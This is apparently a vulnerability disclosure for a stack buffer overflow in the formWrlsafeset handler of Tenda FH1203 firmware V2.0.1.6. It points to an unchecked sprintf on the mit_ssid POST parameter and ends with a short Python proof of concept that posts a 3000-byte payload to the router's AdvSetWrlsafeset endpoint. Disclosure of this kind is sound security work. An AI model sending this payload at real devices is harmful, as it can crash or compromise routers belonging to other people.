

# formWrlsafeset

## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2495.html

## Affected version

FH1203 V2.0.1.6

## Vulnerability details


There is a stack buffer overflow vulnerability in  FH1203 V2.0.1.6, located in the **formWrlsafeset** function. The function receives the `mit_ssid` parameter from a POST request. `   sprintf(v42, "%s\t%s", v23, Var);` The statement will cause a buffer overflow. The `mit_ssid` value provided by the user may exceed the capacity of the `v42` array, thereby triggering this security vulnerability.


![image](https://github.com/user-attachments/assets/d364f34d-5898-4afa-be92-4bd3393771f4)
![image](https://github.com/user-attachments/assets/1a36bd00-96f6-49fe-ab7e-531b27b4024e)


## POC

```python
import requests

ip = "192.168.0.1"
url = "http://" + ip + "/goform/AdvSetWrlsafeset"
payload = b"a"*3000

data = {"mit_ssid": payload}
response = requests.post(url, data=data)
print(response.text)
```
![image](https://github.com/user-attachments/assets/f9f9baaa-24b8-4037-b58b-916f4244ad52)
